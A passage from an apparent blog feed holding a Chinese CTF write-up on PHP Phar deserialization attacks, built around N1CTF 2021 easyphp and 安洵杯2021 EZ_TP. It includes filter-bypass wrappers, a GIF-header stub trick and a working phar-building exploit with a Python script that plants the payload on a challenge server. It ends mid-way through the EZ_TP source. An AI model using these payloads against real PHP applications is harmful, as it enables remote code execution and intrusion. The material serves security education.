without understanding fundamental principles (like me).</p><p>ご武運を！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Write-Up </tag>
            
            <tag> 出题 </tag>
            
            <tag> English </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈Phar反序列化漏洞利用：N1CTF 2021 easyphp &amp; 安洵杯2021 EZ_TP</title>
      <link href="/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/"/>
      <url>/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/</url>
      
        <content type="html"><![CDATA[<h1 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h1><h2 id="什么是Phar"><a href="#什么是Phar" class="headerlink" title="什么是Phar"></a>什么是Phar</h2><blockquote><p>PHp ARchive, like a Java JAR, but for PHP.</p></blockquote><p>phar（PHp ARchive）是类似于JAR的一种打包文件。PHP ≥5.3对Phar后缀文件是默认开启支持的，不需要任何其他的安装就可以使用它。</p><blockquote><p>phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。</p></blockquote><p>说白了，就是一种压缩文件，但是不止能放压缩文件进去。</p><p>在做进一步探究之前需要先调整配置，因为对于Phar文件的相关操作，php缺省状态是只读的（也就是说单纯使用Phar文件不需要任何的调整配置）。但是因为我们现在需要创建一个自己的Phar文件，所以需要允许写入Phar文件，这需要修改一下 <code>php.ini</code></p><p>打开 <code>php.ini</code>，找到 <code>phar.readonly</code> 指令行，修改成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar.<span class="keyword">readonly</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>即可。</p><hr><h2 id="Phar文件格式"><a href="#Phar文件格式" class="headerlink" title="Phar文件格式"></a>Phar文件格式</h2><p>Phar文件由四部分组成：</p><p><strong>1.stub</strong></p><p>stub是phar文件的文件头，格式为<code>xxxxxx&lt;?php ...;__HALT_COMPILER();?&gt;</code>，xxxxxx可以是任意字符，包括留空，且php闭合符与最后一个分号之间不能有多于一个的空格符。另外php闭合符也可省略。</p><p><strong>2.manifest describing the contents</strong></p><p>该区域存放phar包的属性信息，允许每个文件指定文件压缩、文件权限，甚至是用户定义的元数据，如文件用户或组。</p><p><img src="/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/format.png" loading="lazy"></p><p>这里面的metadata以serialize形式储存，为反序列化漏洞埋下了伏笔。</p><p><strong>3.file contents</strong></p><p>被压缩的用户添加的文件内容</p><p>4.<strong>signature</strong></p><p>可选，phar文件的签名，允许的有MD5, SHA1, SHA256, SHA512和OPENSSL.</p><p><img src="/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/signature.png" alt="signature" loading="lazy"></p><p>这部分以<code>GBMB</code>（47 42 4d 42）结尾。</p><p>需要注意，stub不一定要在文件开头。</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>在2018 Black Hat上，安全研究员<code>Sam Thomas</code>分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code> .</p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p><blockquote><p>利用phar文件会以序列化的形式存储用户自定义的<strong>meta-data</strong>这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar:&#x2F;&#x2F;伪协议</strong>，<strong>可以不依赖unserialize()直接进行反序列化操作</strong>。</p></blockquote><p>也就是说，如果我们能控制传入以下函数的参数，就有潜在的phar反序列化漏洞利用可能：</p><p><img src="/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/func.png" loading="lazy"></p><p>还有一些别的函数可用，可参考这篇：<a href="https://www.freebuf.com/articles/web/205943.html">https://www.freebuf.com/articles/web/205943.html</a></p><p><strong>试试看？</strong></p><p>我们先来生成一个phar：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意这边$o反序列化只会保存数据不会保存方法。执行完毕后，我们来观察phar文件的内容：</p><p><img src="/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/hex.png" loading="lazy"></p><p>GBMB结尾的签名以及序列化后的metadata清晰可见。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<span class="comment">//既然是压缩文件，我们可以如此访问其中的某个文件</span></span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的程序执行之后，我们会发现它输出了“Destruct called”.这是由于phar被解析的时候，metadata被反序列化了，于是该实例被析构时调用__destruct函数。这便是反序列化漏洞的来由。</p><p>PHP ≥5.3默认支持phar文件；而在PHP8中，该漏洞被修复：metadata不会自动被反序列化了。（来源请求）</p><hr><h2 id="phar-是什么"><a href="#phar-是什么" class="headerlink" title="phar:&#x2F;&#x2F;是什么"></a><strong>phar:&#x2F;&#x2F;是什么</strong></h2><p>前面提到，我们解析phar文件常常使用phar:&#x2F;&#x2F;伪协议。CTF中，由于伪协议提供了一系列对于文件的封装协议，使得当源程序有可控的文件包含函数时，我们有机会利用这些协议控制其返回值或是完成一些预料外操作（例如反序列化）。作为伪协议的一种，由于phar本质上就是一个特殊的压缩文件，所以phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;其实有很多相似之处，都可以访问压缩包中的子文件，并且zip:&#x2F;&#x2F;需要文件绝对路径，phar:&#x2F;&#x2F;并不需要。（来源请求）</p><hr><h2 id="小tricks"><a href="#小tricks" class="headerlink" title="小tricks"></a><strong>小tricks</strong></h2><h3 id="绕过前缀过滤"><a href="#绕过前缀过滤" class="headerlink" title="绕过前缀过滤"></a>绕过前缀过滤</h3><p>队里师傅的几个example可以类比使用，都是在前缀非phar:&#x2F;&#x2F;的情况下调用了phar:&#x2F;&#x2F;</p><p>compress.bzip2和compress.zlib</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$z</span>);</span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure><hr><h3 id="简单的绕过"><a href="#简单的绕过" class="headerlink" title="简单的绕过"></a>简单的绕过</h3><p>我们可以利用stub部分前缀任意的特性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="comment">//设置 stub，增加 gif 文件头</span></span><br></pre></td></tr></table></figure><p>这可以绕过一部分对文件头的检测。</p><hr><h3 id="绕过前后脏数据"><a href="#绕过前后脏数据" class="headerlink" title="绕过前后脏数据"></a>绕过前后脏数据</h3><p>由于签名部分的存在，php会校验文件哈希值，并检查末尾是否为GBMB，如下是解析部分的源码：</p><p><img src="/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/src.png" loading="lazy"></p><p><a href="https://github.dev/php/php-src">https://github.dev/php/php-src</a></p><p>可见，如果末尾不是GBMB会直接导致解析失败。</p><p>在CTF中利用该漏洞需要我们完成写入&#x2F;上传phar，并调用文件包含函数。我们知道一句话木马由于有<code>&lt;?php ?&gt;</code>这样的头尾标识存在，可以无视前后脏数据；然而对于phar，这样的骚操作被签名部分阻止了。有办法绕过吗？请参阅：<a href="https://www.php.net/manual/zh/phar.converttoexecutable.php">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p><p>利用convertToExecutable函数，我们可以把phar文件转为其他格式的phar文件，例如.tar和.zip格式。</p><p>我们以N1CTF easyphp为例子，这题允许我们写入日志，并且可以利用phar反序列化得到flag，难点在于日志文件前后有额外脏数据，会使得我们的phar文件无法被解析。</p><p>然而如果以tar格式储存phar，末尾的脏数据并不会影响解析（这是tar的格式决定的），而开头的脏数据可以在制造phar文件时就提前构造好（这样这部分数据也会被纳入签名计算），写入日志时不必写入这部分，而是令其与脏数据拼接形成合法的phar。exploit如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  CLASS FLAG &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;FLAG: &quot;</span> . <span class="variable language_">$this</span>-&gt;_flag;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sb</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sb&#x27;</span>];</span><br><span class="line">    <span class="variable">$ts</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ts&#x27;</span>];</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="variable">$sb</span>.<span class="string">&quot;.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    **<span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>); <span class="comment">//会生成*.phar.tar**</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;Time: &quot;</span>.<span class="variable">$ts</span>.<span class="string">&quot; IP: [], REQUEST: [log_type=&quot;</span>.<span class="variable">$sb</span>.<span class="string">&quot;], CONTENT: [&quot;</span>, <span class="string">&quot;&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//tar文件开头是第一个添加文件的的文件名，注意添加的文件顺序不要错了</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line">  <span class="variable">$o</span> -&gt; data = <span class="string">&#x27;g0dsp3ed_1s_g0D&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把这个跑在本地web服务上，然后写个脚本（当时半夜赶制的很丑会留下一些垃圾文件 求轻喷 队里师傅写的干净多了）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">ip = <span class="string">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  生成一个指定长度的随机字符串</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">  length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">    random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">  <span class="keyword">return</span> random_str</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_one</span>(<span class="params">offset</span>):</span><br><span class="line">    rd = generate_random_str(<span class="number">4</span>)</span><br><span class="line">    ts2 = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()+offset))</span><br><span class="line">    ts = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line">    res = rq.get(url=<span class="string">f&quot;http://127.0.0.1/test.php?sb=<span class="subst">&#123;rd&#125;</span>&amp;ts=<span class="subst">&#123;ts2&#125;</span>&quot;</span>)  <span class="comment"># 访问本地生成phar</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;rd&#125;</span>.phar.tar&#x27;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f: </span><br><span class="line">        data = f.read()</span><br><span class="line">    data = data[<span class="number">70</span>::]<span class="comment">#去掉前面的冗余部分以便和log前面拼接形成合法*.phar.tar</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form&#x27;</span>&#125;  <span class="comment"># 源文本</span></span><br><span class="line">    res = rq.post(url=<span class="string">f&quot;http://43.155.59.185:53340/log.php?log_type=<span class="subst">&#123;rd&#125;</span>&quot;</span>,data=data)  <span class="comment"># 写入日志</span></span><br><span class="line">    res = rq.post(url=<span class="string">f&quot;http://43.155.59.185:53340?file=phar://./log/<span class="subst">&#123;ip&#125;</span>/<span class="subst">&#123;rd&#125;</span>_www.log&quot;</span>)  <span class="comment"># 反序列化</span></span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">30</span>,<span class="number">30</span>):<span class="comment">#考虑本地和远程的时间差异，这边设置个30s的窗口期</span></span><br><span class="line">    new_one(i)</span><br><span class="line">    time.sleep(<span class="number">0.9</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;生成的文件长这样（看个开头就行）</span></span><br><span class="line"><span class="string">00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22</span></span><br><span class="line"><span class="string">00000010: 2030 363a 3533 3a31 3520 4950 3a20 5b5d   06:53:15 IP: []</span></span><br><span class="line"><span class="string">00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C</span></span><br><span class="line"><span class="string">00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______</span></span><br><span class="line"><span class="string">00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class="line"><span class="string">00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class="line"><span class="string">00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....</span></span><br><span class="line"><span class="string">00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000</span></span><br><span class="line"><span class="string">00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637</span></span><br><span class="line"><span class="string">00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...</span></span><br><span class="line"><span class="string">000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>不只是tar，还有别的格式：</p><p><img src="/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/targz.png" loading="lazy"><br><a href="https://www.php.net/manual/zh/phar.converttoexecutable.php">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p><p>对应的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>,<span class="title class_">Phar</span>::<span class="variable constant_">BZ2</span>);<span class="comment">//会生成xxxx.phar.tar.bz2</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>,<span class="title class_">Phar</span>::<span class="variable constant_">GZ</span>);<span class="comment">//会生成xxxx.phar.tar.gz</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">ZIP</span>);<span class="comment">//会生成xxxx.phar.zip</span></span><br></pre></td></tr></table></figure><hr><h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a><strong>POP链</strong></h3><p>POP(property oriented programming)，说白了就是经过一连串的魔术方法&#x2F;特殊方法调用达到特定目的的一种攻击方式，本质是通过在调用这些方法的过程中又触发了别的特殊方法，引发连锁反应直到触及目标。phar反序列化使得不存在unserilize函数时这样的攻击也能成功，这正是所谓“扩大攻击面”。我们以刚刚结束的安洵杯2021 EZ_TP为例子。</p><p>网站使用ThinkPHP V5.1.37，网上已有现成的<a href="https://blog.csdn.net/lllffg/article/details/116145918">POP链</a>，现在需要我们在没有unserilize函数的情况下完成反序列化攻击。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$hello</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>])||<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hello&#x27;</span>])) <span class="keyword">exit</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">parse_str</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>],<span class="variable">$haha</span>);</span><br><span class="line">            <span class="title function_ invoke__">extract</span>(<span class="variable">$haha</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;hello.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$hello</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">        <span 